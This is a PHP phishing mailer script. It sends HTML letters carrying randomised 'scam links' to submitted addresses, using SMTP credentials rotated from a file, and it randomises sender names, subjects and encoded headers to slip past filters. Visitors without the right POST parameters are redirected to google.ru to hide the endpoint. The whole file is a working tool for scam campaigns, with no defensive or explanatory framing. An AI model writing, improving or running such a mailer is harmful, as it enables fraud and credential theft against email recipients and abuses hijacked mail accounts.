<?php
set_time_limit(0);
error_reporting(0);
require 'PHPMailer/class.smtp.php';
require 'PHPMailer/class.phpmailer.php';
class SMTPApi {
	var $h0st = "smtp.gmail.com";
	var $custom	= "id-[RAND]";
	var $letter = "letter.html";
	var $sendlog = "logsrelay";
	var $encoding = "yes";
	
	public function __construct() {
		$this->SendID = date("d-m-Y");
		#$this->SendID = "ybh_".substr(md5(rand(11111,99999)),0,7);
		return $this;
	}
	
	private function CreteLogSend($dir) {
		if(!is_dir($dir)) {
			@mkdir($dir);
		}
	}

	private function RandLine($fileName) {
		$f_contents = file($fileName);
		$line = $f_contents[array_rand($f_contents)];
		return $line;
	}
	
	private function RandChar($panjang) {
		$pstring = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"; 
		$plen = strlen($pstring); 
		for ($i = 1; $i <= $panjang; $i++) {
			$start = rand(0,$plen); 
			$unik .= substr($pstring, $start, 1); 
		}	   
		return $unik;
	}
	
	public function Send($email) {
		$this->CreteLogSend($this->sendlog);
		$rand = rand(1111,9999);
		$loadapi = $this->RandLine("conf/smtp.txt");
		$config = explode("|", $loadapi);
		$password = str_replace(array("\n", "\r"), "", $config[1]);
		$username = str_replace(array("\n", "\r"), "", $config[0]);
		$browser  = $this->RandLine("conf/browser.txt");
		$os = $this->RandLine("conf/os.txt");
		$date = date('d F Y, h:i A');
		$email = preg_replace("/\r\n|\r|\n/",'',$email);
		$scamlink = $this->RandLine("conf/scam_link.txt");
		$scamlink = str_replace(array("\n", "\r"), "", $scamlink);
		$scamlink = str_replace("XXX", $this->RandChar(3), $scamlink);
		$scamlink = str_replace("YYY", $this->RandChar(3), $scamlink);
		$scamlink = str_replace("ZZZ", $this->RandChar(3), $scamlink);
		$letter = str_replace(array("\n", "\r"), "", file_get_contents($this->letter));
		$letter = str_replace("##os##", $os, $letter);
		$letter = str_replace("##browser##", $browser, $letter);
		$letter = str_replace("##date##", $date, $letter);
		$letter = str_replace("##url##", $scamlink, $letter);
		$letter = str_replace("##email##", "".$email."", $letter);
		$subject = $this->RandLine("conf/subject.txt");
		$subject = str_replace("##os##", $os, $subject);
		$subject = str_replace("##browser##", $browser, $subject);
		$subject = str_replace(array("\n", "\r"), "", $subject);
		$fromn = $this->RandLine("conf/from_name.txt");
		$fromn = str_replace(array("\n", "\r"), "", $fromn);
		if ($this->encoding == "yes") {
			$subject = preg_replace('/([^a-z ])/ie', 'sprintf("=%02x",ord(StripSlashes("\\1")))', $subject);
			$subject = str_replace(' ', '=20', $subject);
			$subject = "=?utf-8?Q?$subject?=";
			$fromn = preg_replace('/([^a-z ])/ie', 'sprintf("=%02x",ord(StripSlashes("\\1")))', $fromn);
			$fromn = str_replace(' ', '=20', $fromn);
			$fromn = "=?utf-8?Q?$fromn?=";
		}
		$frome = $this->RandLine("conf/from_email.txt");
		$frome = str_replace(array("\n", "\r"), "", $frome);
		$frome = str_replace("##rand##", $rand, $frome);
		$email = str_replace(array("\n", "\r"), "", $email);
		$custom = str_replace("[RAND]", $rand, $this->custom);
		$mail = New PHPMailer();
		$mail->ClearAddresses();
		$mail->SingleTo = true;
        $mail->isSMTP();
		$mail->SMTPKeepAlive = true;
		$mail->IsHTML(true);
		$mail->Host = $this->h0st;
		$mail->SMTPDebug  = 0;
		$mail->Port = 587;
		$mail->SMTPSecure = "tls";
		$mail->SMTPAuth = true;
		$mail->Username = $username;
		$mail->Password = $password;
		$mail->CharSet = "UTF-8";
		$mail->setFrom($frome, $fromn, FALSE);
		$mail->addReplyTo($username, $fromn);
		$mail->addAddress($email);
		$mail->Subject = $subject;
		$mail->addCustomHeader('X-https', $custom);
		$mail->MsgHTML($letter);
		$mail->send();
		if (!filter_var($email, FILTER_VALIDATE_EMAIL) === false) {
			if (empty($mail->ErrorInfo) or stristr($mail->ErrorInfo,"Invalid address:")) {
				echo "SUCCESS";
				$save = fopen($this->sendlog."/".$this->SendID."_SUCCESS.txt", "a");
				fwrite($save, $email."\n");
			} else {
				echo "FAILED";
				$save = fopen($this->sendlog."/".$this->SendID."_ERROR.txt", "a");
				fwrite($save, "ERROR ".$mail->ErrorInfo."|".$email."\n");
			}
		} else {
			echo "INVALID";
			$save = fopen($this->sendlog."/".$this->SendID."_INVALID.txt", "a");
			fwrite($save, $email."\n");
		}
		$mail->SmtpClose();
		$void = PHPMailer::smtpClose();
	}
}

$mail = new SMTPApi();
if(!empty($_POST['email']) && $_POST['action'] == "do") {
	$mail->Send($_POST['email']);
} else {
	header("Location: https://www.google.ru");
}
?>
